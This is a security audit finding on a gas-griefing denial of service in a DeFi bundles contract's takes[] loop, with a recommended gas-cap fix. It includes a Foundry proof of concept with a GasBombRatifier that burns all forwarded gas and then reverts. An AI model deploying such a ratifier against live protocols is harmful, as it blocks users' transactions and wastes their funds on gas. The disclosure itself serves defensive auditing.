### Title
Gas griefing via gas-heavy reverting ratifier in `supplyCollateralAndSellWithUnitsTarget` `takes[]` loop - (File: src/periphery/MidnightBundles.sol)

### Summary
An unprivileged maker can deploy a malicious ratifier contract that burns near-block-gas-limit gas before reverting, then create `offer.buy=true` offers pointing to it. When a victim's `supplyCollateralAndSellWithUnitsTarget` call iterates a `takes[]` array containing N such offers, the `try/catch` at line 152 catches each revert but cannot recover the gas consumed by the failed ratifier call, exhausting the transaction's gas budget after 2–3 iterations and causing the entire call to revert with OOG. Valid offers placed after the gas-bomb entries are never reached.

### Finding Description

**Exact code path:**

`MidnightBundles.supplyCollateralAndSellWithUnitsTarget` (lines 144–161) iterates `takes[]`:

```solidity
for (uint256 i; i < takes.length && filledUnits < targetUnits; i++) {
    require(takes[i].offer.buy, InconsistentSide());          // line 145
    ...
    try IMidnight(MIDNIGHT).take(                              // line 152
        takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(this), address(0), ""
    ) returns (uint256, uint256 resSellerAssets) {
        filledUnits += unitsToTake;
        filledSellerAssets += resSellerAssets;
    } catch {}                                                 // line 160
}
``` [1](#0-0) 

Inside `Midnight.take`, the ratifier is called unconditionally at line 356, **before** any consumption check:

```solidity
require(isAuthorized[offer.maker][offer.ratifier], RatifierUnauthorized());
require(IRatifier(offer.ratifier).isRatified(offer, ratifierData) == CALLBACK_SUCCESS, RatifierFail());
``` [2](#0-1) 

**Attacker-controlled inputs:**

1. Attacker deploys `MaliciousRatifier` implementing `isRatified(...)` that runs a tight loop consuming ~63/64 of forwarded gas, then reverts.
2. Attacker calls `midnight.setIsAuthorized(maliciousRatifier, true, attacker)` — permissionless.
3. Attacker creates N offers: `offer.buy = true`, `offer.maker = attacker`, `offer.ratifier = maliciousRatifier`, valid tick/expiry/market.
4. These offers pass `require(takes[i].offer.buy, InconsistentSide())` at line 145 because `offer.buy == true`.

**EVM gas mechanics (EIP-150):**

Each `try IMidnight(MIDNIGHT).take(...)` forwards at most 63/64 of the caller's remaining gas. When `isRatified` burns all forwarded gas, `take` reverts and returns ~0 gas to MidnightBundles. After the `catch {}`, MidnightBundles retains only ~1/64 of what it had before that iteration. After 2–3 gas-bomb iterations the remaining gas is negligible; the next loop overhead or the subsequent valid `take` call triggers OOG, reverting the entire transaction.

**Why existing checks fail:**

- `InconsistentSide`: requires `offer.buy == true` — attacker satisfies this trivially.
- `RatifierUnauthorized`: attacker self-authorizes their own ratifier.
- `try/catch`: catches the revert from `take` but **cannot refund gas already consumed** by the malicious ratifier. Solidity `try/catch` is not a gas shield.
- `ConsumableUnitsLib.consumableUnits` returning 0 does not skip the `take` call; `unitsToTake = 0` is passed and `isRatified` is still invoked inside `take` before any consumption check. [3](#0-2) 

### Impact Explanation
The victim's `supplyCollateralAndSellWithUnitsTarget` transaction reverts with OOG. Because OOG reverts the entire transaction, the collateral supply (lines 134–140) is also rolled back — no permanent state corruption occurs. The concrete impact is a low-cost, repeatable DoS of the sell-bundle flow: the victim cannot borrow against their collateral via the bundle even when valid offers exist later in `takes[]`, and wastes the full gas cost of the failed transaction on every attempt. [4](#0-3) 

### Likelihood Explanation
**Preconditions:** attacker deploys one gas-bomb ratifier contract (one-time cost), creates ≥2 offers pointing to it, and calls `setIsAuthorized` once. All three steps are permissionless. **Feasibility:** the attacker does not need to front-run; they only need their offers to appear in the victim's routing-supplied `takes[]` array. Since routing is off-protocol and off-chain, an attacker can flood the off-chain order book with gas-bomb offers at negligible cost, causing aggregators/routers to include them. **Repeatability:** the attack is indefinitely repeatable with the same ratifier and offers (offers never get consumed because `take` always reverts before the consumption write at lines 367–373). [5](#0-4) 

### Recommendation
Cap the gas forwarded to each `take` call inside the bundle loop so that a gas-bomb ratifier cannot drain the transaction's budget:

```solidity
try IMidnight(MIDNIGHT).take{gas: BUNDLE_TAKE_GAS_CAP}(
    takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(this), address(0), ""
) returns (uint256, uint256 resSellerAssets) {
    ...
} catch {}
```

`BUNDLE_TAKE_GAS_CAP` should be set to a value sufficient for a legitimate take (including callbacks) but small enough that N failed gas-bomb calls cannot exhaust a standard block gas limit. Alternatively, add a `gasleft()` guard after each `catch {}` and break early with a distinct error if remaining gas falls below a safe threshold, so the victim receives a meaningful revert rather than a silent OOG. The same fix should be applied to all four bundle loops (`buyWithUnitsTargetAndWithdrawCollateral`, `buyWithAssetsTargetAndWithdrawCollateral`, `supplyCollateralAndSellWithAssetsTarget`).

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import "forge-std/Test.sol";
import {MidnightBundles, Take, CollateralSupply} from "src/periphery/MidnightBundles.sol";
import {IRatifier} from "src/interfaces/IRatifier.sol";
import {Offer, CALLBACK_SUCCESS} from "src/interfaces/IMidnight.sol";

/// @dev Ratifier that burns all forwarded gas before reverting.
contract GasBombRatifier is IRatifier {
    function isRatified(Offer memory, bytes memory) external view returns (bytes32) {
        uint256 i;
        while (gasleft() > 600) { unchecked { i++; } } // burn gas
        revert("bomb");
    }
}

contract GasBombTest is Test {
    // ... standard Midnight test setup ...

    function testGasBombDoS() public {
        GasBombRatifier bomb = new GasBombRatifier();

        // Attacker setup: authorize bomb ratifier for attacker's offers
        vm.prank(attacker);
        midnight.setIsAuthorized(address(bomb), true, attacker);

        // Build 3 gas-bomb offers (offer.buy=true, ratifier=bomb)
        Take[] memory takes = new Take[](4);
        for (uint256 i; i < 3; i++) {
            Offer memory o = validBuyOffer(); // offer.buy=true, maker=attacker
            o.ratifier = address(bomb);
            takes[i] = Take({offer: o, units: 1e18, ratifierData: ""});
        }
        // Valid offer at index 3
        takes[3] = Take({offer: validLenderOffer(), units: targetUnits, ratifierData: validRatifierData});

        // Victim call — assert it reverts (OOG or OutOfOffers)
        vm.prank(victim);
        vm.expectRevert(); // OOG causes full revert
        midnightBundles.supplyCollateralAndSellWithUnitsTarget{gas: 3_000_000}(
            targetUnits, 0, victim, victim, new CollateralSupply[](0), takes, 0, address(0)
        );

        // Assert: no debt created, no collateral locked (full revert)
        assertEq(midnight.debtOf(id, victim), 0, "no debt should exist");
        assertEq(midnight.collateral(id, victim, 0), 0, "no collateral should be locked");

        // Fuzz assertion: for any gasLimit in [1M, 30M], bundle with N gas-bomb
        // offers + 1 valid offer never completes when N >= 2.
    }
}
```

**Expected assertions:**
- Transaction reverts (OOG or `OutOfOffers`) when ≥2 gas-bomb offers precede the valid offer.
- `midnight.debtOf(id, victim) == 0` and `midnight.collateral(id, victim, 0) == 0` after revert.
- A fuzz run over `gasLimit ∈ [1e6, 30e6]` and `N ∈ [1, 5]` gas-bomb offers confirms the bundle never completes for `N ≥ 2` regardless of gas limit.

### Citations

**File:** src/periphery/MidnightBundles.sol (L134-140)
```text
        for (uint256 i; i < collateralSupplies.length; i++) {
            address token = market.collateralParams[collateralSupplies[i].collateralIndex].token;
            pullToken(token, msg.sender, collateralSupplies[i].assets, collateralSupplies[i].permit);
            forceApproveMax(token, MIDNIGHT);
            IMidnight(MIDNIGHT)
                .supplyCollateral(market, collateralSupplies[i].collateralIndex, collateralSupplies[i].assets, taker);
        }
```

**File:** src/periphery/MidnightBundles.sol (L144-161)
```text
        for (uint256 i; i < takes.length && filledUnits < targetUnits; i++) {
            require(takes[i].offer.buy, InconsistentSide());
            require(IMidnight(MIDNIGHT).toId(takes[i].offer.market) == id, InconsistentMarket());
            uint256 unitsToTake = min(
                targetUnits - filledUnits,
                takes[i].units,
                ConsumableUnitsLib.consumableUnits(MIDNIGHT, id, takes[i].offer)
            );
            try IMidnight(MIDNIGHT)
                .take(
                    takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(this), address(0), ""
                ) returns (
                uint256, uint256 resSellerAssets
            ) {
                filledUnits += unitsToTake;
                filledSellerAssets += resSellerAssets;
            } catch {}
        }
```

**File:** src/Midnight.sol (L355-356)
```text
        require(isAuthorized[offer.maker][offer.ratifier], RatifierUnauthorized());
        require(IRatifier(offer.ratifier).isRatified(offer, ratifierData) == CALLBACK_SUCCESS, RatifierFail());
```

**File:** src/Midnight.sol (L366-373)
```text
        uint256 newConsumed;
        if (offer.maxAssets > 0) {
            newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
            require(newConsumed <= offer.maxAssets, ConsumedAssets());
        } else {
            newConsumed = consumed[offer.maker][offer.group] += units;
            require(newConsumed <= offer.maxUnits, ConsumedUnits());
        }
```

**File:** src/periphery/ConsumableUnitsLib.sol (L14-23)
```text
    function consumableUnits(address midnight, bytes32 id, Offer memory offer) internal view returns (uint256) {
        uint256 consumed = IMidnight(midnight).consumed(offer.maker, offer.group);
        if (offer.maxUnits > 0) {
            return offer.maxUnits.zeroFloorSub(consumed);
        } else if (offer.buy) {
            return TakeAmountsLib.buyerAssetsToUnits(midnight, id, offer, offer.maxAssets.zeroFloorSub(consumed));
        } else {
            return TakeAmountsLib.sellerAssetsToUnits(midnight, id, offer, offer.maxAssets.zeroFloorSub(consumed));
        }
    }
```
